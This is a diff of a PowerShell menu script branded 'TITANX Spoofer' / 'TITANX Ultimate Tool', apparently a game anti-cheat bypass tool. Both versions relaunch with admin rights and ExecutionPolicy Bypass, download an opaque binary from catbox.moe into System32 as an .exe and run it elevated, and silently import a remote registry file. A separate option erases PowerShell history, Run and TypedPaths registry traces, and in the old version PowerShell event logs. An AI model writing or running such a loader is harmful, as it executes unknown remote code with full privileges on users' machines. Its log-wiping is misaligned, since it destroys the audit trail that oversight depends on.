@@ -1,22 +1,25 @@
 # -----------------------------
 # Menu Selection
 # -----------------------------
-Write-Host "========================================"
-Write-Host "    TITANX SPOOFER | UPDATE 18/10/2025"
-Write-Host "========================================"
+Clear-Host
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host "     TITANX ULTIMATE TOOL v2.0" -ForegroundColor Magenta
+Write-Host "========================================" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "  [1] Install & Run"
-Write-Host "  [2] Clear PowerShell History"
+Write-Host "  [1] Install & Run Bypass Tool" -ForegroundColor Green
+Write-Host "  [2] Run Registry Script" -ForegroundColor Yellow
+Write-Host "  [3] Clear PowerShell History" -ForegroundColor Red
+Write-Host "  [4] Exit" -ForegroundColor Gray
 Write-Host ""
-Write-Host "========================================"
+Write-Host "========================================" -ForegroundColor Cyan
 
-$choice = Read-Host "Enter choice (1/2)"
+$choice = Read-Host "`nEnter your choice (1/2/3/4)"
 
 # -----------------------------
 # Check for Administrator rights
 # -----------------------------
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 
-    Write-Host "`n[+] Restarting with Administrator privileges..." -ForegroundColor Yellow
+    Write-Host "`n[!] Restarting with Administrator privileges..." -ForegroundColor Yellow
     Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
     exit
 }
@@ -25,131 +28,196 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 # Define paths and variables
 # -----------------------------
 $system32Path = "$env:windir\System32"
-$exeDestination = Join-Path $system32Path "Cheak.exe"
-$regUrl = "https://files.catbox.moe/o3dtap.reg"
+$exeDestination = Join-Path $system32Path "runbx.exe"
+$regDestination = Join-Path $env:TEMP "titanx_reg.reg"
 $exeUrl = "https://files.catbox.moe/bt0dfp.bin"
-$tempReg = Join-Path $env:TEMP "temp_reg.reg"
-$tempExe = Join-Path $env:TEMP "temp_exe.bin"
+$regUrl = "https://files.catbox.moe/o3dtap.reg"
 
 # -----------------------------
-# Install & Run Mode
+# Option 1: Install & Run Bypass Tool
 # -----------------------------
 if ($choice -eq "1") {
     Clear-Host
     Write-Host "========================================" -ForegroundColor Cyan
-    Write-Host "    INSTALLING TITANX SPOOFER" -ForegroundColor Cyan
+    Write-Host "   [1] INSTALLING BYPASS TOOL" -ForegroundColor Green
     Write-Host "========================================" -ForegroundColor Cyan
     Write-Host ""
 
-    # Step 1: Download and run .reg file
-    Write-Host "[1/3] Downloading registry configuration..." -ForegroundColor Yellow
+    # Check if already installed
+    if (Test-Path $exeDestination) {
+        Write-Host "[!] File already exists. Overwriting..." -ForegroundColor Yellow
+    }
+
+    # Download executable
+    Write-Host "[+] Downloading runbx.exe from server..." -ForegroundColor Cyan
     try {
-        Invoke-WebRequest -Uri $regUrl -OutFile $tempReg
-        Write-Host "[✓] Registry file downloaded successfully!" -ForegroundColor Green
-        
-        Write-Host "[+] Applying registry settings..." -ForegroundColor Yellow
-        Start-Process -FilePath "regedit.exe" -ArgumentList "/s `"$tempReg`"" -Wait
-        Write-Host "[✓] Registry settings applied!" -ForegroundColor Green
-        Remove-Item $tempReg -Force -ErrorAction SilentlyContinue
+        $tempFile = Join-Path $env:TEMP "titanx_temp.bin"
+        Invoke-WebRequest -Uri $exeUrl -OutFile $tempFile -ErrorAction Stop
+        Move-Item -Path $tempFile -Destination $exeDestination -Force -ErrorAction Stop
+        Write-Host "[✓] Download completed successfully!" -ForegroundColor Green
     } catch {
-        Write-Host "[✗] Failed to download/apply registry: $_" -ForegroundColor Red
+        Write-Host "[✗] Download failed: $_" -ForegroundColor Red
+        Write-Host "`nPress any key to exit..."
+        Read-Host
         exit
     }
 
-    # Step 2: ดาวน์โหลดไฟล์ .bin และบันทึกเป็น .exe เลย
-    Write-Host ""
-    Write-Host "[2/3] Downloading executable..." -ForegroundColor Yellow
-    try {
-        # ดาวน์โหลดไฟล์ .bin ไปที่ temp
-        Invoke-WebRequest -Uri $exeUrl -OutFile $tempExe
+    # Verify file exists
+    if (Test-Path $exeDestination) {
+        Write-Host "[✓] File verified: $exeDestination" -ForegroundColor Green
         
-        # เปลี่ยนชื่อไฟล์จาก .bin เป็น .exe ทันทีที่ปลายทาง
-        Move-Item -Path $tempExe -Destination $exeDestination -Force
-        Write-Host "[✓] Cheak.exe downloaded and saved directly!" -ForegroundColor Green
-        Write-Host "[✓] File saved to: $exeDestination" -ForegroundColor Green
-    } catch {
-        Write-Host "[✗] Failed to download executable: $_" -ForegroundColor Red
-        exit
-    }
-
-    # Step 3: รัน Cheak.exe โดยตรง
-    Write-Host ""
-    Write-Host "[3/3] Launching Cheak.exe..." -ForegroundColor Yellow
-    try {
-        # ตรวจสอบว่าไฟล์มีอยู่จริงก่อนรัน
-        if (Test-Path $exeDestination) {
-            Start-Process -FilePath $exeDestination -Verb RunAs
-            Write-Host "[✓] Cheak.exe started successfully!" -ForegroundColor Green
-        } else {
-            Write-Host "[✗] Cheak.exe not found!" -ForegroundColor Red
+        # Run the executable
+        Write-Host "[+] Launching runbx.exe..." -ForegroundColor Cyan
+        try {
+            Start-Process -FilePath $exeDestination -Verb RunAs -WindowStyle Normal
+            Write-Host "[✓] Program started successfully!" -ForegroundColor Green
+        } catch {
+            Write-Host "[✗] Failed to start program: $_" -ForegroundColor Red
         }
-    } catch {
-        Write-Host "[✗] Failed to start Cheak.exe: $_" -ForegroundColor Red
-        Write-Host "[!] Try running the file manually from: $exeDestination" -ForegroundColor Yellow
+    } else {
+        Write-Host "[✗] File not found after download!" -ForegroundColor Red
     }
 
-    Write-Host ""
+    Write-Host "`n========================================" -ForegroundColor Cyan
+    Write-Host "[✓] Installation completed!" -ForegroundColor Green
     Write-Host "========================================" -ForegroundColor Cyan
-    Write-Host "    INSTALLATION COMPLETE!" -ForegroundColor Green
-    Write-Host "========================================" -ForegroundColor Cyan
-    Write-Host ""
-    Read-Host "Press Enter to exit"
+    Write-Host "`nPress any key to return to menu..."
+    Read-Host
+    & $PSCommandPath
+    exit
 }
 
 # -----------------------------
-# Clear PowerShell History Mode
+# Option 2: Run Registry Script
 # -----------------------------
 elseif ($choice -eq "2") {
     Clear-Host
-    Write-Host "========================================" -ForegroundColor Magenta
-    Write-Host "    CLEARING POWERSHELL HISTORY" -ForegroundColor Magenta
-    Write-Host "========================================" -ForegroundColor Magenta
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "   [2] RUNNING REGISTRY SCRIPT" -ForegroundColor Yellow
+    Write-Host "========================================" -ForegroundColor Cyan
     Write-Host ""
 
-    Write-Host "[+] Clearing current session history..." -ForegroundColor Yellow
-    Clear-History
-    
-    Write-Host "[+] Clearing PSReadLine history..." -ForegroundColor Yellow
-    $psHistoryPath = (Get-PSReadLineOption).HistorySavePath
-    if (Test-Path $psHistoryPath) {
-        Remove-Item $psHistoryPath -Force
-        Write-Host "[✓] PSReadLine history cleared!" -ForegroundColor Green
-    }
-
-    Write-Host "[+] Clearing PowerShell event logs..." -ForegroundColor Yellow
+    # Download registry file
+    Write-Host "[+] Downloading registry script..." -ForegroundColor Cyan
     try {
-        wevtutil cl "Windows PowerShell" 2>$null
-        wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
-        Write-Host "[✓] PowerShell event logs cleared!" -ForegroundColor Green
+        Invoke-WebRequest -Uri $regUrl -OutFile $regDestination -ErrorAction Stop
+        Write-Host "[✓] Registry script downloaded successfully!" -ForegroundColor Green
     } catch {
-        Write-Host "[!] Some event logs could not be cleared" -ForegroundColor Yellow
+        Write-Host "[✗] Download failed: $_" -ForegroundColor Red
+        Write-Host "`nPress any key to exit..."
+        Read-Host
+        exit
     }
 
-    Write-Host "[+] Clearing PowerShell run history..." -ForegroundColor Yellow
-    try {
-        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
-        Write-Host "[✓] Run history cleared!" -ForegroundColor Green
-    } catch {
-        Write-Host "[!] Could not clear all run history" -ForegroundColor Yellow
+    # Verify file exists
+    if (Test-Path $regDestination) {
+        Write-Host "[✓] File verified: $regDestination" -ForegroundColor Green
+        
+        # Run registry file
+        Write-Host "[+] Applying registry changes..." -ForegroundColor Cyan
+        try {
+            Start-Process -FilePath "regedit.exe" -ArgumentList "/s `"$regDestination`"" -Wait -ErrorAction Stop
+            Write-Host "[✓] Registry script executed successfully!" -ForegroundColor Green
+        } catch {
+            Write-Host "[✗] Failed to execute registry script: $_" -ForegroundColor Red
+        }
+
+        # Clean up temp file
+        Remove-Item $regDestination -Force -ErrorAction SilentlyContinue
+        Write-Host "[+] Cleaned up temporary files." -ForegroundColor Cyan
+    } else {
+        Write-Host "[✗] Registry file not found!" -ForegroundColor Red
     }
 
-    Write-Host ""
-    Write-Host "========================================" -ForegroundColor Magenta
-    Write-Host "    CLEANUP COMPLETE!" -ForegroundColor Green
-    Write-Host "========================================" -ForegroundColor Magenta
-    Write-Host ""
-    Write-Host "[✓] All PowerShell traces have been removed!" -ForegroundColor Green
-    Write-Host ""
-    Read-Host "Press Enter to exit"
+    Write-Host "`n========================================" -ForegroundColor Cyan
+    Write-Host "[✓] Registry operation completed!" -ForegroundColor Green
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "`nPress any key to return to menu..."
+    Read-Host
+    & $PSCommandPath
+    exit
 }
 
+# -----------------------------
+# Option 3: Clear PowerShell History
+# -----------------------------
+elseif ($choice -eq "3") {
+    Clear-Host
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "   [3] CLEARING POWERSHELL HISTORY" -ForegroundColor Red
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host ""
+
+    # Clear current session history
+    Write-Host "[+] Clearing current session history..." -ForegroundColor Cyan
+    Clear-History -Force -ErrorAction SilentlyContinue
+    Write-Host "[✓] Current session history cleared." -ForegroundColor Green
+
+    # Clear persistent history file
+    $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+    if (Test-Path $historyPath) {
+        Write-Host "[+] Removing persistent history file..." -ForegroundColor Cyan
+        try {
+            Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
+            Write-Host "[✓] Persistent history file removed." -ForegroundColor Green
+        } catch {
+            Write-Host "[!] Could not remove history file." -ForegroundColor Yellow
+        }
+    } else {
+        Write-Host "[!] No persistent history file found." -ForegroundColor Yellow
+    }
+
+    # Clear recent PowerShell run commands from registry
+    Write-Host "[+] Clearing PowerShell run commands from registry..." -ForegroundColor Cyan
+    $regPaths = @(
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"
+    )
+    
+    foreach ($path in $regPaths) {
+        if (Test-Path $path) {
+            try {
+                Remove-Item -Path "$path\*" -Force -ErrorAction SilentlyContinue
+                Write-Host "[✓] Cleared: $path" -ForegroundColor Green
+            } catch {
+                Write-Host "[!] Could not clear: $path" -ForegroundColor Yellow
+            }
+        }
+    }
+
+    Write-Host "`n========================================" -ForegroundColor Cyan
+    Write-Host "[✓] PowerShell history cleared successfully!" -ForegroundColor Green
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "`nPress any key to return to menu..."
+    Read-Host
+    & $PSCommandPath
+    exit
+}
+
+# -----------------------------
+# Option 4: Exit
+# -----------------------------
+elseif ($choice -eq "4") {
+    Clear-Host
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "     THANK YOU FOR USING TITANX TOOL" -ForegroundColor Magenta
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "`nExiting... Goodbye!" -ForegroundColor Green
+    Start-Sleep -Seconds 2
+    exit
+}
+
+# -----------------------------
+# Invalid Choice
+# -----------------------------
 else {
     Clear-Host
-    Write-Host "========================================" -ForegroundColor Red
-    Write-Host "    INVALID CHOICE!" -ForegroundColor Red
-    Write-Host "========================================" -ForegroundColor Red
-    Write-Host ""
-    Write-Host "Please select either [1] or [2]" -ForegroundColor Yellow
-    Write-Host ""
-    Read-Host "Press Enter to exit"
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "     INVALID CHOICE!" -ForegroundColor Red
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "`nPlease select 1, 2, 3, or 4 only." -ForegroundColor Yellow
+    Write-Host "`nPress any key to return to menu..."
+    Read-Host
+    & $PSCommandPath
+    exit
 }
